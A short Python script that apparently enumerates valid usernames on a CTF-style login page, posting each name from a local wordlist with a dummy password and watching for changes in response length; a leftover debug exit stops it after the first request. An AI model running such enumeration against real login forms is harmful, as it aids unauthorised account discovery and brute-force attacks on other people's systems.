import requests

def check_username(url, wordlist, field_name):
    print(field_name)

    resp_len = 0
    with open(wordlist, 'r') as users:
        for i, user in enumerate(users):
            data = {field_name: user, 'password': 'x'}
            r = requests.post(url, data)

            # print(user, ' ', len(r.content))
            print(r.text)
            exit()

            # print if any change in length
            if resp_len != len(r.content):
                resp_len = len(r.content)
                print('\n', resp_len, ' ', user, '\n')

            print(f'No. of words checked: {i+1}\r', end='  ')

            print(f'\n{user}\n')


if __name__ == '__main__':
    url = 'http://35.190.155.168/8fc44258fc/login'
    userLIst = '/home/prasant/Documents/wordlists/usernames/names.txt'
    field_name = 'username'

    check_username(url, userLIst, field_name)

